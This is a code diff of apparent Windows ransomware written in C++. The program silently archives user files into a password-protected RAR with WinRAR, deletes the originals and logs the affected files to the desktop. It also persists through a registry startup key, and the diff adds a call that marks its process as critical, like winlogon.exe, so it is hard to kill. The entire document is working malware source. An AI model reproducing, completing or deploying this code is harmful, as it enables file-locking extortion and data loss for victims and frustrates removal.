@@ -5,6 +5,7 @@
 #include <Windows.h>
 #include <sstream>		/* char to string */ 
 #include <sys/stat.h>   /* for check if file exists */
+#include "protector.h"
 using namespace std;
 
 bool fileExists(const std::string& filename);
@@ -38,15 +39,15 @@ int main(){
 	-IBCK	run silently
 	-df		delete file after finish
 	*/
-	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +" -mt2 a -ioff -inul -df -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
+	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +"-mt2 a -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	//put filePath to double quotes  - fullResult
 	TCHAR fullResult[MAX_PATH];
 	fullResult[0] = NULL;
 	TCHAR fullFilePath[MAX_PATH] = "\"";
-	strcat(fullResult, fullFilePath);
-	strcat(fullResult, filePath);
-	strcat(fullResult, "\"");
+	strcat_s(fullResult, fullFilePath);
+	strcat_s(fullResult, filePath);
+	strcat_s(fullResult, "\"");
 	//write itself to start-up by registry key 
 	//std::cout << fullResult << std::endl; //debug
 	HKEY hkey;
@@ -57,24 +58,21 @@ int main(){
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	//check if rar exist or not
 	if(fileExists(rarPath)){ 
-		if(fileExists(tempName)){
+		if(fileExists(tempName) || fileExists(desktopName)){
 			MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop
+			ProtectProcess();  //make process as critical . example : winlogon.exe 
+			while(true){}; //for futher develope
 		}
 		else{
 		//std::cout << "Exist" << std::endl;
 		WinExec(fullCommandRar.c_str(), 1);
-		Sleep(99999999999999); //sleep till restart
+		Sleep(9999999); //sleep till restart
 		}
 	}
 	else{
 		//std::cout << "Not Exist" << std::endl;
 	}
 		//std::system("pause");
-//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-	//std::cout << fullCommandRar << std::endl;
-	/*std::cout << tempName << std::endl << desktopName; */		//debug
-	//WinExec("\"C:\\Program Files\\WinRAR\\WinRAR.exe\" -mt2 a -inul -IBCK -ace -p=1234 -m1 -logf=\"C:\\Users\\Tuan Linh\\Desktop\\crypted_file.txt\" \"C:\\Users\\Tuan Linh\\Desktop\\test\\tuanlinh.rar\" \"C:\\Users\\*\\*.txt\"",1);
-	//MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop
 	return 0;
 }
 
@@ -93,7 +91,6 @@ bool fileExists(const std::string& filename)
 
 std::string generateKey(){
 	srand (time(NULL));
-	char ascii;
 	int asciiNum, randomNum;
 	std::string secretKey, randomNumStr, randomNumStreamStr, asciiNumStr;
 	for(int i = 0; i < 16; i++){
